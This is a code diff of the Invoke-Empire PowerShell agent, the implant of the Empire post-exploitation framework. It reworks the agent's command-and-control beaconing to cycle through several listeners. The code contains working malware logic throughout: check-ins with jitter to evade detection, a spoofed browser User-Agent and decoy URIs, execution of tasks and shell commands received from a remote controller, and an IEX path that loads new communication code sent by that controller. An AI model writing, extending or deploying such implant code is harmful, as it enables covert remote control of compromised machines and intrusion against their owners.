@@ -17,9 +17,6 @@ function Invoke-Empire {
         .PARAMETER SessionID
         A unique alphanumeric sessionID to use for identification
 
-        .PARAMETER Servers
-        Array of C2 servers to use
-
         .PARAMETER KillDate
         Kill date limit for agent operation
 
@@ -29,15 +26,6 @@ function Invoke-Empire {
         .PARAMETER WorkingHours
         Working hours for agent operation, format "8:00,17:00"
 
-        .PARAMETER Profile
-        http communication profile
-        request_uris(comma separated)|UserAgents(comma separated)
-
-        .PARAMETER LostLimit
-        The limit of the number of checkins the agent will miss before exiting
-
-        .PARAMETER DefaultResponse
-        A base64 representation of the default response for the given transport.
     #>
 
     param(
@@ -59,9 +47,6 @@ function Invoke-Empire {
         [Double]
         $AgentJitter = 0,
 
-        [String[]]
-        $Servers,
-
         [String]
         $KillDate,
 
@@ -72,16 +57,7 @@ function Invoke-Empire {
         $WorkingHours,
 
         [object]
-        $ProxySettings,
-
-        [String]
-        $Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-
-        [Int32]
-        $LostLimit = 60,
-
-        [String]
-        $DefaultResponse = ""
+        $ProxySettings
     )
 
     ############################################################
@@ -93,15 +69,13 @@ function Invoke-Empire {
     $Encoding = [System.Text.Encoding]::ASCII
     $HMAC = New-Object System.Security.Cryptography.HMACSHA256
 
-    $script:AgentDelay = $AgentDelay
-    $script:AgentJitter = $AgentJitter
-    $script:LostLimit = $LostLimit
-    $script:MissedCheckins = 0
     $script:ResultIDs = @{}
     $script:WorkingHours = $WorkingHours
-    $script:DefaultResponse = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultResponse))
     $script:Proxy = $ProxySettings
     $script:CurrentListenerName = ""
+    $script:SessionID = $SessionID
+    $script:StagingKey = $StagingKey
+    $script:SessionKey = $SessionKey
 
     # the currently active server
     $Script:ServerIndex = 0
@@ -117,24 +91,6 @@ function Invoke-Empire {
 
     if($KillDate -ne "REPLACE_KILLDATE" -and $KillDate -ne $null) {
         $script:KillDate = $KillDate
-    }
-
-    # get all the headers/etc. in line for our comms
-    #   Profile format:
-    #       uris(comma separated)|UserAgent|header1=val|header2=val2...
-    #       headers are optional. format is "key:value"
-    #       ex- cookies are "cookie:blah=123;meh=456"
-    $ProfileParts = $Profile.split('|')
-    $script:TaskURIs = $ProfileParts[0].split(',')
-    $script:UserAgent = $ProfileParts[1]
-    $script:SessionID = $SessionID
-    $script:Headers = @{}
-    # add any additional request headers if there are any specified in the profile
-    if($ProfileParts[2]) {
-        $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
-            $Parts = $_.Split(':')
-            $script:Headers.Add($Parts[0],$Parts[1])
-        }
     }
 
     # keep track of all background jobs
@@ -179,10 +135,20 @@ function Invoke-Empire {
     }
 
     function Set-Delay {
-        param([int]$d, [double]$j=0.0)
-        $script:AgentDelay = $d
-        $script:AgentJitter = $j
-        "agent interval set to $script:AgentDelay seconds with a jitter of $script:AgentJitter"
+        param($listenerName, [int]$d, [double]$j=0.0)
+        foreach ($l in $script:listeners) {
+            if ($l["name"] -eq $listenerName) {
+
+                $l["delay"] = $d
+                $l["jitter"] = $j
+
+                "agent interval set to $d seconds with a jitter of $j for listener"
+                $listenername
+
+                break
+            }
+        }
+
     }
 
     function Get-Delay {
@@ -190,15 +156,21 @@ function Invoke-Empire {
     }
 
     function Set-LostLimit {
-        param([int]$l)
-        $script:LostLimit = $l
-        if($l -eq 0)
-        {
-            "agent set to never die based on checkin Limit"
-        }
-        else
-        {
-            "agent LostLimit set to $script:LostLimit"
+        param($listenername,[int]$l)
+        foreach ($Listener in $script:listeners){
+            if ($Listener["name"] -eq $listenername){
+                $Listener["lostLimit"] = $l
+               if($l -eq 0)
+                {
+                    "agent set to never die based on checkin Limit"
+                }
+                else
+                {
+                    "agent LostLimit set to "
+                    $Listener["LostLimit"]
+                }
+                break
+            }
         }
     }
 
@@ -249,14 +221,6 @@ function Invoke-Empire {
         $str += "|powershell|" + $PSVersionTable.PSVersion.Major;
         $str
     }
-
-    # # TODO: add additional callback servers ?
-    # function Add-Servers {
-    #     param([string[]]$BackupServers)
-    #     foreach ($backup in $BackupServers) {
-    #         $Script:ControlServers = $Script:ControlServers + $backup
-    #     }
-    # }
 
     # handle shell commands and return any results
     function Invoke-ShellCommand {
@@ -765,8 +729,97 @@ function Invoke-Empire {
     # C2 functions
     #
     ############################################################
+	#COMM_FUNCTION
+	#TASK_FUNCTION
 
-    REPLACE_COMMS
+	$script:curlistener = ''
+    $script:listeners = @(
+		#LISTENER_DICT
+		#Example listener entry
+		#@{
+#        delay = 60
+#        jitter = 0.0
+#        profile= "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv=11.0) like Gecko"
+#        fixed_parameters= @{param1= 12
+                             #param2= "Mozilla"} #fixed immutable parameters used by the function such as the profile
+#        send_func= myfunc
+#        get_task_func=otherfunc
+#        lostLimit= 60
+#        missedCheckins=4
+#        defaultResponse="whatever"
+#    }
+
+
+	)
+
+	function SleepWithJitter($listener) {
+# if there's a delay (i.e. no interactive/delay 0) then sleep for the specified time
+		if ($listener["delay"] -ne 0) {
+			$SleepMin = [int]((1-$listener["jitter"])*$listener["delay"])
+			$SleepMax = [int]((1+$listener["jitter"])*$listener["delay"])
+
+			if ($SleepMin -eq $SleepMax) {
+				$SleepTime = $SleepMin
+			}
+			else{
+				$SleepTime = Get-Random -Minimum $SleepMin -Maximum $SleepMax
+			}
+			Start-Sleep -Seconds $sleepTime;
+		}
+	}
+
+	$script:CleanUpListeners = {
+		$newlisteners = @()
+		foreach ($l in $script:listeners){
+			if ( $l["lostLimit"] -ne 0 -and $l["missedCheckins"] -lt $l["lostLimit"]){
+				$newlisteners += $l
+			}
+		}
+		$script:listeners = $newlisteners
+	}
+
+	# send message function iterating through listeners
+	$script:SendMessage = {
+		param($Packets)
+		if ($Packets) {
+			foreach ($Listener in $script:listeners){
+				SleepWithJitter($Listener)	
+				$response = (& $Listener["send_func"] -Packets $Packets -FixedParameters $Listener["fixed_parameters"])
+				if ($response){#a message got through
+					$Listener["missedCheckins"] = 0
+					break
+				}
+				$Listener["missedCheckins"] += 1
+			}
+			(& $script:CleanUpListeners)
+		}
+	}
+
+	$script:GetTask = {
+        param($HasWaited)
+		foreach ($Listener in $script:listeners){
+            if (!$HasWaited) {
+                SleepWithJitter($Listener)	
+            }
+			"calling getTask with listener" | Out-File "out.log" -Append -NoClobber
+			$Listener["name"]|Out-File "out.log" -Append -NoClobber
+
+			$TaskData = (& $Listener['get_task_func'] -FixedParameters $Listener["fixed_parameters"])
+			if (!$TaskData){
+				"no task data, increasing missedcheckins"|Out-File "out.log" -Append -NoClobber
+				$Listener['missedCheckins'] += 1
+			}
+			else {
+				$Listener["missedCheckins"] = 0
+				if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $Listener['defaultResponse']) {
+					"got something not equal to defaultResponse, calling decoderoutingpacket"|Out-File "out.log" -Append -NoClobber
+					Decode-RoutingPacket -PacketData $TaskData
+				}
+				break
+			}
+		}
+		(& $script:CleanUpListeners)
+	}
 
     # process a single tasking packet extracted from a tasking and execute the functionality
     function Process-Tasking {
@@ -978,19 +1031,13 @@ function Invoke-Empire {
                 try {
                     IEX $data
 
+                    $script:listeners += $script:NewListenerDict
                     Encode-Packet -type $type -data ($CurrentListenerName) -ResultID $ResultID
                 }
                 catch {
                     
                     Encode-Packet -type 0 -data ("Unable to update agent comm methods: $_") -ResultID $ResultID
                 }
-            }
-
-            elseif($type -eq 131) {
-                # Update the listener name variable
-                $script:CurrentListenerName = $data
-
-                Encode-Packet -type $type -data ("Updated the CurrentListenerName to: $CurrentListenerName") -ResultID $ResultID
             }
 
             else{
@@ -1060,7 +1107,7 @@ function Invoke-Empire {
     while ($True) {
 
         # check the kill date and lost limit, exiting and returning job output if either are past
-        if ( (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) -or ((!($script:LostLimit -eq 0)) -and ($script:MissedCheckins -gt $script:LostLimit)) ) {
+        if ( (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) ) {
 
             $Packets = $null
 
@@ -1122,20 +1169,7 @@ function Invoke-Empire {
             }
         }
 
-        # if there's a delay (i.e. no interactive/delay 0) then sleep for the specified time
-        if ($script:AgentDelay -ne 0) {
-            $SleepMin = [int]((1-$script:AgentJitter)*$script:AgentDelay)
-            $SleepMax = [int]((1+$script:AgentJitter)*$script:AgentDelay)
-
-            if ($SleepMin -eq $SleepMax) {
-                $SleepTime = $SleepMin
-            }
-            else{
-                $SleepTime = Get-Random -Minimum $SleepMin -Maximum $SleepMax
-            }
-            Start-Sleep -Seconds $sleepTime;
-        }
-
+        
         # poll running jobs, receive any data, and remove any completed jobs
         $JobResults = $Null
         ForEach($JobName in $Script:Jobs.Keys) {
@@ -1154,20 +1188,20 @@ function Invoke-Empire {
             }
         }
 
+        $has_waited = $False
         if ($JobResults) {
             ((& $SendMessage -Packets $JobResults))
+            $has_waited = $True
         }
 
         # get the next task from the server
-        $TaskData = (& $GetTask)
-        if ($TaskData) {
-            $script:MissedCheckins = 0
-            # did we get not get the default response
-            if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $script:DefaultResponse) {
-                Decode-RoutingPacket -PacketData $TaskData
-            }
-        }
+        (& $GetTask -HasWaited $has_waited)
 
+		# if we are out of listeners, exit
+		if ($script:listeners.count -eq 0){
+			exit
+		}
+		
         # force garbage collection to clean up :)
         [GC]::Collect()
     }
